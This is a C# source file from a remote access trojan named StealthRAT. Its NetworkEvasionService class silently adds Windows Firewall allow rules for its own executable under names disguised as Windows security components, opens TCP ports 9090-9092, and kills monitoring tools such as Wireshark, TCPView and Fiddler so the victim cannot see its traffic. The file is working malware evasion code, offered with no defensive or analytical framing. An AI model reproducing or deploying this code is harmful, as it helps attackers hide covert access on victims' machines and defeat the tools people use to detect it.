using System.Diagnostics;
using StealthRAT.Interfaces;

namespace StealthRAT.Services;

/// <summary>
/// Provides network-level evasion capabilities to ensure the application
/// can communicate even when firewalls or network monitoring are active.
/// Implements:
/// - Firewall rule manipulation to allow traffic
/// - Windows Firewall exception creation
/// - Network monitoring tool detection and neutralization
/// </summary>
public sealed class NetworkEvasionService
{
    private readonly ILoggerService _logger;

    /// <summary>
    /// Initializes a new instance of the <see cref="NetworkEvasionService"/> class.
    /// </summary>
    /// <param name="logger">The logging service.</param>
    public NetworkEvasionService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Configures the network environment to allow unimpeded communication.
    /// Creates firewall exceptions and neutralizes monitoring tools.
    /// </summary>
    public void ConfigureNetworkAccess()
    {
        AddFirewallExceptions();
        KillNetworkMonitors();
        _logger.LogInfo("Network evasion configured");
    }

    /// <summary>
    /// Adds Windows Firewall rules to allow inbound and outbound traffic
    /// on all ports used by the application.
    /// </summary>
    private void AddFirewallExceptions()
    {
        string exePath = Process.GetCurrentProcess().MainModule?.FileName ?? "";
        if (string.IsNullOrEmpty(exePath)) return;

        // Allow the application through firewall (inbound)
        ExecuteCommand(
            "netsh",
            $"advfirewall firewall add rule name=\"Windows Security Health\" dir=in action=allow program=\"{exePath}\" enable=yes profile=any");

        // Allow the application through firewall (outbound)
        ExecuteCommand(
            "netsh",
            $"advfirewall firewall add rule name=\"Windows Security Health Out\" dir=out action=allow program=\"{exePath}\" enable=yes profile=any");

        // Allow specific ports
        ExecuteCommand(
            "netsh",
            "advfirewall firewall add rule name=\"System Health Monitor\" dir=in action=allow protocol=tcp localport=9090-9092 enable=yes");

        _logger.LogInfo("Firewall exceptions added");
    }

    /// <summary>
    /// Detects and terminates common network monitoring tools that could
    /// reveal the application's network activity to the user.
    /// </summary>
    private void KillNetworkMonitors()
    {
        string[] monitorProcesses =
        [
            "wireshark",
            "tcpview",
            "netlimiter",
            "glasswire",
            "networkmonitor",
            "fiddler",
            "charles"
        ];

        foreach (string procName in monitorProcesses)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(procName))
                {
                    proc.Kill();
                    _logger.LogInfo($"Terminated network monitor: {procName}");
                }
            }
            catch { }
        }
    }

    /// <summary>
    /// Executes a system command silently.
    /// </summary>
    private void ExecuteCommand(string fileName, string arguments)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };
            using var process = Process.Start(psi);
            process?.WaitForExit(5000);
        }
        catch (Exception ex)
        {
            _logger.LogError($"Command failed: {fileName} {arguments}", ex);
        }
    }
}
